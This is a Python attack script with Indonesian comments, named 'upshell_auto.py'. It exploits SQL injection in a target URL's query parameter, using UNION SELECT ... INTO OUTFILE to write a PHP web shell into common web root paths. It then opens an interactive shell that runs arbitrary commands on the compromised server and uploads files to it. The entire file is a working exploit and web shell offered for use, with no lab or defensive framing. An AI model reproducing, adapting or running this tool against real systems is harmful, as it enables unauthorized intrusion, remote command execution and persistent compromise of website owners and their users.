# upshell_auto.py

import requests
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

# Shell PHP sederhana untuk eksekusi perintah dan upload file
WEB_SHELL = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded.";
}
?>'''

# Lokasi target untuk upload shell
UPLOAD_PATHS = [
    "/var/www/html/shell.php",
    "/tmp/shell.php",
    "/srv/http/shell.php"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (UpshellAuto)"
}

def build_url_with_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

def attempt_upload_shell(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if not query:
        print("[-] Tidak ditemukan parameter untuk disuntik.")
        return None

    target_param = list(query.keys())[0]  # ambil parameter pertama
    for path in UPLOAD_PATHS:
        payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
        exploit_url = build_url_with_payload(url, target_param, payload)
        try:
            print(f"[!] Mencoba upload ke {path}...")
            requests.get(exploit_url, headers=HEADERS, timeout=10)
            shell_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            time.sleep(1)
            check = requests.get(shell_url, headers=HEADERS, timeout=5)
            if check.status_code == 200 and "cmd" in check.text:
                print(f"[+] Shell aktif di: {shell_url}")
                return shell_url
        except Exception as e:
            continue
    print("[-] Gagal upload shell.")
    return None

def shell_interactive(shell_url):
    print("\n[+] Masuk mode shell. Ketik 'exit' untuk keluar. Bisa juga upload file.")
    while True:
        cmd = input("shell> ")
        if cmd.lower() == 'exit':
            break
        elif cmd.startswith("upload "):
            file_path = cmd.split(" ", 1)[1]
            try:
                with open(file_path, 'rb') as f:
                    files = {'file': (file_path, f)}
                    r = requests.post(shell_url, files=files)
                    print(r.text)
            except FileNotFoundError:
                print("[!] File tidak ditemukan.")
        else:
            try:
                r = requests.get(shell_url, params={"cmd": cmd})
                print(r.text)
            except:
                print("[!] Gagal mengirim perintah.")

def main():
    parser = argparse.ArgumentParser(description="Upshell Auto Exploiter")
    parser.add_argument("-u", "--url", help="Target URL dengan parameter", required=True)
    args = parser.parse_args()

    shell_url = attempt_upload_shell(args.url)
    if shell_url:
        shell_interactive(shell_url)

if __name__ == "__main__":
    main()
